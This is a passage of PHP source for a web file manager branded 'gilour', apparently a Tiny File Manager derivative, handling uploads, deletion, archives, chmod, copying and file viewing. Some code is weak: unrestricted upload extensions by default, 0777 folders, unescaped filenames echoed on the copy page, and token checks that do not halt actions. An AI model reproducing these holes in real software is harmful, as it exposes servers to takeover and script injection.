        $path .= '/' . FM_PATH;
    }

    $errors = 0;
    $uploads = 0;
    $allowed = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
    $response = array (
        'status' => 'error',
        'info'   => 'Oops! Try again'
    );

    $filename = $f['file']['name'];
    $tmp_name = $f['file']['tmp_name'];
    $ext = pathinfo($filename, PATHINFO_FILENAME) != '' ? strtolower(pathinfo($filename, PATHINFO_EXTENSION)) : '';
    $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

    if(!fm_isvalid_filename($filename) and !fm_isvalid_filename($fullPathInput)) {
        $response = array (
            'status'    => 'error',
            'info'      => "Invalid File name!",
        );
        echo json_encode($response); exit();
    }

    $targetPath = $path . $ds;
    if ( is_writable($targetPath) ) {
        $fullPath = $path . '/' . $fullPathInput;
        $folder = substr($fullPath, 0, strrpos($fullPath, "/"));

        if (!is_dir($folder)) {
            $old = umask(0);
            mkdir($folder, 0777, true);
            umask($old);
        }
        if (empty($f['file']['error']) and !empty($tmp_name) and $tmp_name != 'none' and $isFileAllowed) {
            if ($chunkTotal){
                $out = @fopen("{$fullPath}.part", $chunkIndex == 0 ? "wb" : "ab");
                if ($out) {
                    $in = @fopen($tmp_name, "rb");
                    if ($in) {
                        if (PHP_VERSION_ID < 80009) {
                            do {
                                for (;;) {
                                    $buff = fread($in, 4096);
                                    if ($buff === false || $buff === '') {
                                        break;
                                    }
                                    fwrite($out, $buff);
                                }
                            } while (!feof($in));
                        } else {
                            stream_copy_to_stream($in, $out);
                        }
                        $response = array (
                            'status'    => 'success',
                            'info' => "file upload successful"
                        );
                    } else {
                        $response = array (
                        'status'    => 'error',
                        'info' => "failed to open output stream",
                        'errorDetails' => error_get_last()
                        );
                    }
                    @fclose($in);
                    @fclose($out);
                    @unlink($tmp_name);

                    $response = array (
                        'status'    => 'success',
                        'info' => "file upload successful"
                    );
                } else {
                    $response = array (
                        'status'    => 'error',
                        'info' => "failed to open output stream"
                        );
                }

                if ($chunkIndex == $chunkTotal - 1) {
                    if (file_exists ($fullPath)) {
                        $ext_1 = $ext ? '.'.$ext : '';
                        $fullPathTarget = $path . '/' . basename($fullPathInput, $ext_1) .'_'. date('ymdHis'). $ext_1;
                    } else {
                        $fullPathTarget = $fullPath;
                    }
                    rename("{$fullPath}.part", $fullPathTarget);
                }

            } else {
                if (rename($tmp_name, $fullPath)) {
                    if ( file_exists($fullPath) ) {
                        $response = array (
                            'status'    => 'success',
                            'info' => "file upload successful"
                        );
                    } else {
                        $response = array (
                            'status' => 'error',
                            'info'   => 'Couldn\'t upload the requested file.'
                        );
                    }
                } else {
                    $response = array (
                        'status'    => 'error',
                        'info'      => "Error while uploading files. Uploaded files $uploads",
                    );
                }
            }
        }
    } else {
        $response = array (
            'status' => 'error',
            'info'   => 'The specified folder for upload isn\'t writeable.'
        );
    }
    // Return the response
    echo json_encode($response);
    exit();
}


if (isset($_POST['group'], $_POST['delete'], $_POST['token']) and !FM_READONLY) {

    if(!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }

    $errors = 0;
    $files = $_POST['file'];
    if (is_array($files) and count($files)) {
        foreach ($files as $f) {
            if ($f != '') {
                $new_path = $path . '/' . $f;
                if (!fm_rdelete($new_path)) {
                    $errors++;
                }
            }
        }
        if ($errors == 0) {
            fm_set_msg(lng('Selected files and folder deleted'));
        } else {
            fm_set_msg(lng('Error while deleting items'), 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }

    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}


if (isset($_POST['group'], $_POST['token']) and (isset($_POST['zip']) || isset($_POST['tar'])) and !FM_READONLY) {

    if(!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $path = FM_ROOT_PATH;
    $ext = 'zip';
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }

    //set pack type
    $ext = isset($_POST['tar']) ? 'tar' : 'zip';

    if (($ext == "zip" and !class_exists('ZipArchive')) || ($ext == "tar" and !class_exists('PharData'))) {
        fm_set_msg(lng('Operations with archives are not available'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    $files = $_POST['file'];
    $sanitized_files = array();

    // clean path
    foreach($files as $file){
        array_push($sanitized_files, fm_clean_path($file));
    }
    
    $files = $sanitized_files;
    
    if (!empty($files)) {
        chdir($path);

        if (count($files) == 1) {
            $one_file = reset($files);
            $one_file = basename($one_file);
            $zipname = $one_file . '_' . date('ymd_His') . '.'.$ext;
        } else {
            $zipname = 'archive_' . date('ymd_His') . '.'.$ext;
        }

        if($ext == 'zip') {
            $zipper = new FM_Zipper();
            $res = $zipper->create($zipname, $files);
        } elseif ($ext == 'tar') {
            $tar = new FM_Zipper_Tar();
            $res = $tar->create($zipname, $files);
        }

        if ($res) {
            fm_set_msg(sprintf(lng('Archive').' <b>%s</b> '.lng('Created'), fanco($zipname)));
        } else {
            fm_set_msg(lng('Archive not created'), 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }

    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}

// Unpack zip, tar
if (isset($_POST['unzip'], $_POST['token']) and !FM_READONLY) {

    if(!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $unzip = urldecode($_POST['unzip']);
    $unzip = fm_clean_path($unzip);
    $unzip = str_replace('/', '', $unzip);
    $isValid = false;

    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }

    if ($unzip != '' and is_file($path . '/' . $unzip)) {
        $zip_path = $path . '/' . $unzip;
        $ext = pathinfo($zip_path, PATHINFO_EXTENSION);
        $isValid = true;
    } else {
        fm_set_msg(lng('File not found'), 'error');
    }

    if (($ext == "zip" and !class_exists('ZipArchive')) || ($ext == "tar" and !class_exists('PharData'))) {
        fm_set_msg(lng('Operations with archives are not available'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    if ($isValid) {
        //to folder
        $tofolder = '';
        if (isset($_POST['tofolder'])) {
            $tofolder = pathinfo($zip_path, PATHINFO_FILENAME);
            if (fm_mkdir($path . '/' . $tofolder, true)) {
                $path .= '/' . $tofolder;
            }
        }

        if($ext == "zip") {
            $zipper = new FM_Zipper();
            $res = $zipper->unzip($zip_path, $path);
        } elseif ($ext == "tar") {
            try {
                $gzipper = new PharData($zip_path);
                if (@$gzipper->extractTo($path,null, true)) {
                    $res = true;
                } else {
                    $res = false;
                }
            } catch (Exception $e) {

                $res = true;
            }
        }

        if ($res) {
            fm_set_msg(lng('Archive unpacked'));
        } else {
            fm_set_msg(lng('Archive not unpacked'), 'error');
        }
    } else {
        fm_set_msg(lng('File not found'), 'error');
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}


if (isset($_POST['chmod'], $_POST['token']) and !FM_READONLY and !FM_IS_WIN) {

    if(!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }
    
    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }

    $file = $_POST['chmod'];
    $file = fm_clean_path($file);
    $file = str_replace('/', '', $file);
    if ($file == '' || (!is_file($path . '/' . $file) and !is_dir($path . '/' . $file))) {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    $mode = 0;
    if (!empty($_POST['ur'])) {
        $mode |= 0400;
    }
    if (!empty($_POST['uw'])) {
        $mode |= 0200;
    }
    if (!empty($_POST['ux'])) {
        $mode |= 0100;
    }
    if (!empty($_POST['gr'])) {
        $mode |= 0040;
    }
    if (!empty($_POST['gw'])) {
        $mode |= 0020;
    }
    if (!empty($_POST['gx'])) {
        $mode |= 0010;
    }
    if (!empty($_POST['or'])) {
        $mode |= 0004;
    }
    if (!empty($_POST['ow'])) {
        $mode |= 0002;
    }
    if (!empty($_POST['ox'])) {
        $mode |= 0001;
    }

    if (@chmod($path . '/' . $file, $mode)) {
        fm_set_msg(lng('Permissions changed'));
    } else {
        fm_set_msg(lng('Permissions not changed'), 'error');
    }

    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}


$path = FM_ROOT_PATH;
if (FM_PATH != '') {
    $path .= '/' . FM_PATH;
}

if (!is_dir($path)) {
    fm_redirect(FM_SELF_URL . '?p=');
}

$parent = fm_get_parent_path(FM_PATH);

$objects = is_readable($path) ? scandir($path) : array();
$folders = array();
$files = array();
$current_path = array_slice(explode("/",$path), -1)[0];
if (is_array($objects) and fm_is_exclude_items($current_path)) {
    foreach ($objects as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }
        if (!FM_SHOW_HIDDEN and substr($file, 0, 1) === '.') {
            continue;
        }
        $new_path = $path . '/' . $file;
        if (@is_file($new_path) and fm_is_exclude_items($file)) {
            $files[] = $file;
        } elseif (@is_dir($new_path) and $file != '.' and $file != '..' and fm_is_exclude_items($file)) {
            $folders[] = $file;
        }
    }
}

if (!empty($files)) {
    natcasesort($files);
}
if (!empty($folders)) {
    natcasesort($folders);
}

if (isset($_GET['upload']) and !FM_READONLY) {
    fm_show_header(); 
    fm_show_nav_path(FM_PATH); 
    function getUploadExt() {
        $extArr = explode(',', FM_UPLOAD_EXTENSION);
        if(FM_UPLOAD_EXTENSION and $extArr) {
            array_walk($extArr, function(&$x) {$x = ".$x";});
            return implode(',', $extArr);
        }
        return '';
    }
    ?>
    <?php print_external('css-dropzone'); ?>
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper <?php echo fm_get_theme(); ?>">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php echo lng('UploadingFiles') ?></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> <?php echo lng('Upload from URL') ?></a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php echo FM_PATH ?>" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo lng('Back')?></a>
                    <strong><?php echo lng('DestinationFolder') ?></strong>: <?php echo fanco(fm_convert_win(FM_PATH)) ?>
                </p>

                <form action="<?php echo htmlspecialchars(FM_SELF_URL) . '?p=' . fanco(FM_PATH) ?>" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php echo fanco(FM_PATH) ?>">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php echo fanco(FM_PATH) ?>">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                    <div class="fallback">
                        <input name="file" type="file" multiple/>
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="row row-cols-lg-auto g-3 align-items-center" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                        <button type="submit" class="btn btn-primary ms-3"><?php echo lng('Upload') ?></button>
                        <div class="lds-facebook"><div></div><div></div><div></div></div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <?php print_external('js-dropzone'); ?>
    <script>
        Dropzone.options.fileUploader = {
            chunking: true,
            chunkSize: <?php echo UPLOAD_CHUNK_SIZE; ?>,
            forceChunking: true,
            retryChunks: true,
            retryChunksLimit: 3,
            parallelUploads: 1,
            parallelChunkUploads: false,
            timeout: 120000,
            maxFilesize: "<?php echo MAX_UPLOAD_SIZE; ?>",
            acceptedFiles : "<?php echo getUploadExt() ?>",
            init: function () {
                this.on("sending", function (file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        toast('Error: Server Timeout');
                    });
                }).on("success", function (res) {
                    try {
                        let _response = JSON.parse(res.xhr.response);

                        if(_response.status == "error") {
                            toast(_response.info);
                        }
                    } catch (e) {
                        toast("Error: Invalid JSON response");
                    }
                }).on("error", function(file, response) {
                    toast(response);
                });
            }
        }
    </script>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_POST['copy']) and !FM_READONLY) {
    $copy_files = isset($_POST['file']) ? $_POST['file'] : null;
    if (!is_array($copy_files) || empty($copy_files)) {
        fm_set_msg(lng('Nothing selected'), 'alert');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    ?>
    <div class="path">
        <div class="card <?php echo fm_get_theme(); ?>">
            <div class="card-header">
                <h6><?php echo lng('Copying') ?></h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php echo fanco(FM_PATH) ?>">
                    <input type="hidden" name="finish" value="1">
                    <?php
                    foreach ($copy_files as $cf) {
                        echo '<input type="hidden" name="file[]" value="' . fanco($cf) . '">' . PHP_EOL;
                    }
                    ?>
                    <p class="break-word"><strong><?php echo lng('Files') ?></strong>: <b><?php echo implode('</b>, <b>', $copy_files) ?></b></p>
                    <p class="break-word"><strong><?php echo lng('SourceFolder') ?></strong>: <?php echo fanco(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?><br>
                        <label for="inp_copy_to"><strong><?php echo lng('DestinationFolder') ?></strong>:</label>
                        <?php echo FM_ROOT_PATH ?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php echo fanco(FM_PATH) ?>">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label ms-2"> <?php echo lng('Move') ?></label></p>
                    <p>
                        <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></a></b>&nbsp;
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Copy') ?></button> 
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_GET['copy']) and !isset($_GET['finish']) and !FM_READONLY) {
    $copy = $_GET['copy'];
    $copy = fm_clean_path($copy);
    if ($copy == '' || !file_exists(FM_ROOT_PATH . '/' . $copy)) {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    fm_show_header(); 
    fm_show_nav_path(FM_PATH); 
    ?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            <strong>Source path:</strong> <?php echo fanco(fm_convert_win(FM_ROOT_PATH . '/' . $copy)) ?><br>
            <strong>Destination folder:</strong> <?php echo fanco(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?>
        </p>
        <p>
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="text-danger"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i><?php echo lng('Select folder') ?></i></p>
        <ul class="folders break-word">
            <?php
            if ($parent !== false) {
                ?>
                <li><a href="?p=<?php echo urlencode($parent) ?>&amp;copy=<?php echo urlencode($copy) ?>"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
                <?php
            }
            foreach ($folders as $f) {
                ?>
                <li>
                    <a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>&amp;copy=<?php echo urlencode($copy) ?>"><i class="fa fa-folder-o"></i> <?php echo fm_convert_win($f) ?></a></li>
                <?php
            }
            ?>
        </ul>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_GET['settings']) and !FM_READONLY) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    global $cfg, $lang, $lang_list;
    ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-cog"></i>  <?php echo lng('Settings') ?></span>
                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label"><?php echo lng('Language') ?></label>
                        <div class="col-sm-5">
                            <select class="form-select" id="js-language" name="js-language">
                                <?php
                                function getSelected($l) {
                                    global $lang;
                                    return ($lang == $l) ? 'selected' : '';
                                }
                                foreach ($lang_list as $k => $v) {
                                    echo "<option value='$k' ".getSelected($k).">$v</option>";
                                }
                                ?>
                            </select>
                        </div>
                    </div>
                    <div class="mt-3 mb-3 row ">
                        <label for="js-error-report" class="col-sm-3 col-form-label"><?php echo lng('ErrorReporting') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-error-report" name="js-error-report" value="true" <?php echo $report_errors ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-show-hidden" class="col-sm-3 col-form-label"><?php echo lng('ShowHiddenFiles') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-show-hidden" name="js-show-hidden" value="true" <?php echo $show_hidden_files ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-hide-cols" class="col-sm-3 col-form-label"><?php echo lng('HideColumns') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-hide-cols" name="js-hide-cols" value="true" <?php echo $hide_Cols ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-3-1" class="col-sm-3 col-form-label"><?php echo lng('Theme') ?></label>
                        <div class="col-sm-5">
                            <select class="form-select w-100" id="js-3-0" name="js-theme-3">
                                <option value='light' <?php if($theme == "light"){echo "selected";} ?>><?php echo lng('light') ?></option>
                                <option value='dark' <?php if($theme == "dark"){echo "selected";} ?>><?php echo lng('dark') ?></option>
                            </select>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <div class="col-sm-10">
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php echo lng('Save'); ?></button>
                        </div>
                    </div>

                </form>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_GET['help'])) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    global $cfg, $lang;
    ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-exclamation-circle"></i> <?php echo lng('Help') ?></span>
                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
            </h6>
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="." target="_blank" class="app-v-title"> gilour <?php echo VERSION; ?></a></h3></p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="." target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="." target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
                                <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php echo lng('Generate new password hash') ?></a></li>
                                <?php } ?>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row js-new-pwd hidden mt-2">
                    <div class="col-12">
                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
                            <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
                            <div class="form-group mb-2">
                                <label for="staticEmail2"><?php echo lng('Generate new password hash') ?></label>
                            </div>
                            <div class="form-group mx-sm-3 mb-2">
                                <label for="inputPassword2" class="sr-only"><?php echo lng('Password') ?></label>
                                <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="<?php echo lng('Password') ?>" required>
                            </div>
                            <button type="submit" class="btn btn-success btn-sm mb-2"><?php echo lng('Generate') ?></button>
                        </form>
                        <textarea class="form-control" rows="2" readonly id="js-pwd-result"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_GET['view'])) {
    $file = $_GET['view'];
    $file = fm_clean_path($file, false);
    $file = str_replace('/', '', $file);
    if ($file == '' || !is_file($path . '/' . $file) || !fm_is_exclude_items($file)) {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
    $file_path = $path . '/' . $file;

    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $mime_type = fm_get_mime_type($file_path);
    $filesize_raw = fm_get_size($file_path);
    $filesize = fm_get_filesize($filesize_raw);

    $is_zip = false;
    $is_gzip = false;
    $is_image = false;
    $is_audio = false;
    $is_video = false;
    $is_text = false;
    $is_onlineViewer = false;

    $view_title = 'File';
    $filenames = false; // for zip
    $content = ''; // for text
    $online_viewer = strtolower(FM_DOC_VIEWER);

    if($online_viewer and $online_viewer !== 'false' and in_array($ext, fm_get_onlineViewer_exts())){
        $is_onlineViewer = true;
    }
    elseif ($ext == 'zip' || $ext == 'tar') {
        $is_zip = true;
        $view_title = 'Archive';
        $filenames = fm_get_zif_info($file_path, $ext);
    } elseif (in_array($ext, fm_get_image_exts())) {
        $is_image = true;
        $view_title = 'Image';
    } elseif (in_array($ext, fm_get_audio_exts())) {
        $is_audio = true;
        $view_title = 'Audio';
    } elseif (in_array($ext, fm_get_video_exts())) {
        $is_video = true;
        $view_title = 'Video';
    } elseif (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, fm_get_text_mimes())) {
        $is_text = true;
        $content = file_get_contents($file_path);
    }

    ?>
    <div class="row">
        <div class="col-12">
            <p class="break-word"><b><?php echo lng($view_title) ?> "<?php echo fanco(fm_convert_win($file)) ?>"</b></p>
            <p class="break-word">
                <?php $display_path = fm_get_display_path($file_path); ?>
                <strong><?php echo $display_path['label']; ?>:</strong> <?php echo $display_path['path']; ?><br>
                <strong>File size:</strong> <?php echo ($filesize_raw <= 1000) ? "$filesize_raw bytes" : $filesize; ?><br>
                <strong>MIME-type:</strong> <?php echo $mime_type ?><br>
                <?php
                // ZIP info
                if (($is_zip || $is_gzip) and $filenames !== false) {
                    $total_files = 0;
                    $total_comp = 0;
                    $total_uncomp = 0;
                    foreach ($filenames as $fn) {
                        if (!$fn['folder']) {
                            $total_files++;
                        }
                        $total_comp += $fn['compressed_size'];
                        $total_uncomp += $fn['filesize'];
                    }
                    ?>
                    <?php echo lng('Files in archive') ?>: <?php echo $total_files ?><br>
                    <?php echo lng('Total size') ?>: <?php echo fm_get_filesize($total_uncomp) ?><br>
                    <?php echo lng('Size in archive') ?>: <?php echo fm_get_filesize($total_comp) ?><br>
                    <?php echo lng('Compression') ?>: <?php echo round(($total_comp / max($total_uncomp, 1)) * 100) ?>%<br>
                    <?php
                }
                // Image info
                if ($is_image) {
                    $image_size = getimagesize($file_path);
                    echo '<strong>'.lng('Image size').':</strong> ' . (isset($image_size[0]) ? $image_size[0] : '0') . ' x ' . (isset($image_size[1]) ? $image_size[1] : '0') . '<br>';
                }
                // Text info
                if ($is_text) {
                    $is_utf8 = fm_is_utf8($content);
                    if (function_exists('iconv')) {
                        if (!$is_utf8) {
                            $content = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $content);
                        }
                    }
                    echo '<strong>'.lng('Charset').':</strong> ' . ($is_utf8 ? 'utf-8' : '8 bit') . '<br>';
                }
                ?>
            </p>
            <div class="d-flex align-items-center mb-3">
                <form method="post" class="d-inline ms-2" action="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($file) ?>">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                    <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0"><i class="fa fa-cloud-download"></i> <?php echo lng('Download') ?></button> &nbsp;
                </form>
                <b class="ms-2"><a href="<?php echo fanco($file_url) ?>" target="_blank"><i class="fa fa-external-link-square"></i> <?php echo lng('Open') ?></a></b>
                <?php
                // ZIP actions
                if (!FM_READONLY and ($is_zip || $is_gzip) and $filenames !== false) {
                    $zip_name = pathinfo($file_path, PATHINFO_FILENAME);
                    ?>
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                        <input type="hidden" name="unzip" value="<?php echo urlencode($file); ?>">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;"><i class="fa fa-check-circle"></i> <?php echo lng('UnZip') ?></button>
                    </form>&nbsp;
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                        <input type="hidden" name="unzip" value="<?php echo urlencode($file); ?>">
                        <input type="hidden" name="tofolder" value="1">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php echo fanco($zip_name) ?>"><i class="fa fa-check-circle"></i> <?php echo lng('UnZipToFolder') ?></button>
                    </form>&nbsp;
                    <?php
                }
                if ($is_text and !FM_READONLY) {
                    ?>
                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>" class="edit-file"><i class="fa fa-pencil-square"></i> <?php echo lng('Edit') ?>
                        </a></b> &nbsp;
                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&env=ace"
                            class="edit-file"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor') ?>
                        </a></b> &nbsp;
                <?php } ?>
                <b class="ms-2"><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo lng('Back') ?></a></b>
            </div>
            <?php
            if($is_onlineViewer) {
                if($online_viewer == 'google') {
                    echo '<iframe src="https://docs.google.com/viewer?embedded=true&hl=en&url=' . fanco($file_url) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                } else if($online_viewer == 'microsoft') {
                    echo '<iframe src="https://view.officeapps.live.com/op/embed.aspx?src=' . fanco($file_url) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                }
            } elseif ($is_zip) {
                // ZIP content
                if ($filenames !== false) {
                    echo '<code class="maxheight">';
                    foreach ($filenames as $fn) {
                        if ($fn['folder']) {
                            echo '<b>' . fanco($fn['name']) . '</b><br>';
                        } else {
                            echo $fn['name'] . ' (' . fm_get_filesize($fn['filesize']) . ')<br>';
                        }
                    }
                    echo '</code>';
                } else {
                    echo '<p>'.lng('Error while fetching archive info').'</p>';
                }
            } elseif ($is_image) {
                // Image content
                if (in_array($ext, array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))) {
                    echo '<p><input type="checkbox" id="preview-img-zoomCheck"><label for="preview-img-zoomCheck"><img src="' . fanco($file_url) . '" alt="image" class="preview-img"></label></p>';
                }
            } elseif ($is_audio) {
                // Audio content
                echo '<p><audio src="' . fanco($file_url) . '" controls preload="metadata"></audio></p>';
            } elseif ($is_video) {
                // Video content
                echo '<div class="preview-video"><video src="' . fanco($file_url) . '" width="640" height="360" controls preload="metadata"></video></div>';
            } elseif ($is_text) {
                if (FM_USE_HIGHLIGHTJS) {
                    // highlight
                    $hljs_classes = array(
                        'shtml' => 'xml',
                        'htaccess' => 'apache',
                        'phtml' => 'php',
                        'lock' => 'json',
                        'svg' => 'xml',
                    );
